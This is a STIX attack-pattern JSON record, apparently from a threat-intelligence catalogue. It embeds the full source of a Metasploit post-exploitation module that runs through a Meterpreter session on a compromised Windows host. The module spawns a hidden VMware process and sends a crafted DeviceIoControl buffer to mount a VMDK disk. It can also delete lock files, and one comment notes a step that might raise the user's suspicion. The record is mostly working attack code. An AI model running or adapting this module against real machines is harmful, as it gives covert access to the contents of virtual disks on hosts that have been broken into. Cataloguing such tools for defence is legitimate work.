{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e79309ec-7176-44d6-a3f0-71864d1d8f6c",
    "created": "2024-08-14T16:33:04.982972Z",
    "modified": "2024-08-14T16:33:04.982975Z",
    "name": "Windows Manage VMDK Mount Drive",
    "description": " This module mounts a vmdk file (Virtual Machine Disk) on a drive provided by the user by taking advantage of the vstor2 device driver (VMware). First, it executes the binary vixDiskMountServer.exe to access the device and then it sends certain control code via DeviceIoControl to mount it. Use the write mode with extreme care. You should only open a disk file in writable mode if you know for sure that no snapshots or clones are linked from the file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/vmdk_mount.rb",
            "external_id": "vmdk_mount.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.shelliscoming.com/2017/05/post-exploitation-mounting-vmdk-files.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::FileSystem\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage VMDK Mount Drive',\n        'Description' => %q{\n          This module mounts a vmdk file (Virtual Machine Disk) on a drive provided by the user by taking advantage\n          of the vstor2 device driver (VMware). First, it executes the binary vixDiskMountServer.exe to access the\n          device and then it sends certain control code via DeviceIoControl to mount it. Use the write mode with\n          extreme care. You should only open a disk file in writable mode if you know for sure that no snapshots\n          or clones are linked from the file.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'Borja Merino <bmerinofe[at]gmail.com>',\n        'References' => [\n          ['URL', 'http://www.shelliscoming.com/2017/05/post-exploitation-mounting-vmdk-files.html']\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_fs_ls\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_process_execute\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('VMDK_PATH', [true, 'Full path to the .vmdk file']),\n        OptString.new('DRIVE', [true, 'Mount point (drive letter)', 'Z']),\n        OptBool.new('READ_MODE', [true, 'Open file in read-only mode', true]),\n        OptBool.new('DEL_LCK', [true, 'Delete .vmdk lock file', false]),\n      ]\n    )\n  end\n\n  def run\n    vol = datastore['DRIVE'][0].upcase\n    vmdk = datastore['VMDK_PATH']\n    if vol.count('EFGHIJKLMNOPQRSTUVWXYZ') == 0\n      print_error('Wrong drive letter. Choose another one')\n      return\n    end\n\n    drives = get_drives\n    if drives.include? vol\n      print_error(\"The following mount points already exists: #{drives}. Choose another one\")\n      return\n    end\n\n    # Using stat instead of file? to check if the file exists due to this https://github.com/rapid7/metasploit-framework/issues/8202\n    begin\n      client.fs.file.stat(vmdk)\n    rescue StandardError\n      print_error(\"File #{vmdk} not found\")\n      return\n    end\n\n    vmware_path = registry_getvaldata('HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\vmplayer.exe', 'path')\n\n    if vmware_path.nil?\n      print_error('VMware installation path not found.')\n      return\n    end\n\n    print_status(\"VMware path: \\\"#{vmware_path}\\\"\")\n\n    vstor_device = find_vstor2_device\n    if vstor_device.nil?\n      return\n    end\n\n    if !open_mountserver(vmware_path) || !mount_vmdk(vstor_device, vmdk, vol, datastore['READ_MODE'])\n      return\n    end\n\n    # Just few seconds to mount the unit and create the lck file\n    sleep(5)\n\n    if get_drives.include? vol\n      print_good(\"The drive #{vol}: seems to be ready\")\n      if datastore['DEL_LCK']\n        delete_lck(vmdk)\n      end\n    else\n      print_error(\"The drive couldn't be mounted. Check if a .lck file is blocking the access to the vmdk file\")\n      # Some snapshots could give some problems when are mount in write mode\n      if !datastore['READ_MODE']\n        print_status('Try to mount the drive in read only mode')\n      end\n    end\n  end\n\n  # Delete the lck file generated after mounting the drive\n  def delete_lck(vmdk)\n    lck_dir = vmdk << '.lck'\n    begin\n      files = client.fs.dir.entries(lck_dir)\n      vprint_status(\"Directory lock: #{lck_dir}\")\n    rescue Rex::Post::Meterpreter::RequestError\n      print_status('It was not found a lck directory')\n      return\n    end\n\n    files.shift(2)\n    files.each do |f|\n      f_path = lck_dir + \"\\\\#{f}\"\n      next if !file?(f_path)\n\n      fd = client.fs.file.open(f_path)\n      content = fd.read.to_s\n      fd.close\n      next unless content.include? 'vixDiskMountServer'\n\n      begin\n        client.fs.file.rm(f_path)\n        print_status(\"Lock file #{f} deleted\")\n      rescue ::Exception => e\n        print_error(\"Unable to remove file: #{e.message}\")\n      end\n    end\n  end\n\n  # Recover the device drive name created by vstor2-mntapi20-shared.sys\n  def find_vstor2_device\n    reg_services = 'HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\'\n    devices = registry_enumkeys(reg_services)\n    vstor2_key = devices.grep(/^vstor2/)\n    if vstor2_key.none?\n      print_error(\"No vstor2 key found on #{reg_services}\")\n      return\n    end\n\n    device_path = registry_getvaldata(reg_services << vstor2_key[0], 'ImagePath')\n\n    if device_path.nil?\n      print_error('No image path found for the vstor2 device')\n      return\n    end\n\n    device_name = device_path.split('\\\\')[-1].split('.')[0]\n    print_status(\"Device driver name found: \\\\\\\\.\\\\#{device_name}\")\n    device_name.insert(0, '\\\\\\\\.\\\\')\n  end\n\n  # Mount the vmdk file by sending a magic control code via DeviceIoControl\n  def mount_vmdk(vstore, vmdk_file, vol, read_mode)\n    # DWORD value representing the drive letter\n    i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.index(vol)\n    drive_dword = [(0x00000001 << i)].pack('V')\n    vprint_status(\"DWORD value for drive #{vol}: = #{drive_dword.inspect}\")\n\n    ret = session.railgun.kernel32.CreateFileW(vstore, 'GENERIC_WRITE|GENERIC_READ', 'FILE_SHARE_READ|FILE_SHARE_WRITE', nil, 'OPEN_EXISTING', 0, nil)\n    if ret['GetLastError'] != 0\n      print_error(\"Unable to open a handle to the #{vstore} device driver. GetLastError: #{ret['GetLastError']} \")\n      return false\n    end\n    # fd1, fd3 and fd5 are static values used from vixDiskMountApi.dll to build the input buffer\n    fd1 = \"\\x24\\x01\\x00\\x00\"\n    fd2 = \"\\x00\\x00\\x00\\x00\"\n    fd3 = \"\\xBA\\xAB\\x00\\x00\"\n    fd4 = \"\\x00\\x00\\x00\\x00\"\n    fd5 = \"\\x02\\x00\\x00\\x00\"\n    fd6 = \"\\x00\\x00\\x00\\x00\"\n    path = vmdk_file.ljust 260, \"\\x00\"\n    if read_mode\n      fd7 = \"\\x01\\x00\\x00\\x00\"\n    else\n      fd7 = \"\\x00\\x00\\x00\\x00\"\n    end\n\n    # The total length of the buffer should be 292\n    buffer = fd1 << fd2 << fd3 << fd4 << fd5 << fd6 << drive_dword << path << fd7\n\n    error_code = ''\n    tries = 0\n    loop do\n      ioctl = client.railgun.kernel32.DeviceIoControl(ret['return'], 0x2A002C, buffer, 292, 16348, 16348, 4, nil)\n      error_code = ioctl['GetLastError']\n      vprint_status(\"GetlastError DeviceIoControl = #{error_code}\")\n      tries += 1\n      break if tries == 3 || (error_code != 31 && error_code != 6)\n    end\n\n    if error_code == 997 || error_code == 0\n      client.railgun.kernel32.CloseHandle(ret['return'])\n      return true\n    else\n      print_error(\"The vmdk file could't be mounted\")\n      return false\n    end\n  end\n\n  # Run the hidden vixDiskMountServer process needed to interact with the driver\n  def open_mountserver(path)\n    mount_bin = 'vixDiskMountServer.exe'\n    if !file?(path << mount_bin)\n      print_error(\"#{mount_bin} not found in \\\"#{path}\\\"\")\n      return false\n    end\n\n    # If the vixDiskMountServer process is created by VMware (i.e. when the mapping utility is used) it will not be\n    # possible to mount the file. In this case killing vixDiskMountServer manually from Meterpreter and re-running\n    # the script could be a solution (although this can raise suspicions to the user).\n\n    # On the other hand, if vixDiskMountServer has been created by Meterpreter it would not be necessary to kill\n    # the process to run the script again and mount another drive except if you change the mode (write or read only).\n    # For this reason, to avoid this case, the process is relaunched automatically.\n    p = session.sys.process.each_process.find { |i| i['name'] == mount_bin }\n\n    if p\n      if p['ppid'] != session.sys.process.getpid\n        print_error(\"An instance of #{mount_bin} is already running by another process\")\n        return false\n      else\n        begin\n          print_status(\"Killing the #{mount_bin} instance\")\n          session.sys.process.kill(p['pid'])\n          sleep(1)\n        rescue ::Rex::Post::Meterpreter::RequestError => e\n          print_error(\"The #{mount_bin} instance depending on Meterpreter could not be killed\")\n          return false\n        end\n      end\n    end\n\n    begin\n      proc = session.sys.process.execute(path, nil, { 'Hidden' => true })\n      sleep(1)\n      print_good(\"Process #{mount_bin} successfully spawned (Pid: #{proc.pid})\")\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Binary #{mount_bin} could could not be spawned : #{e}\")\n      return false\n    end\n\n    true\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}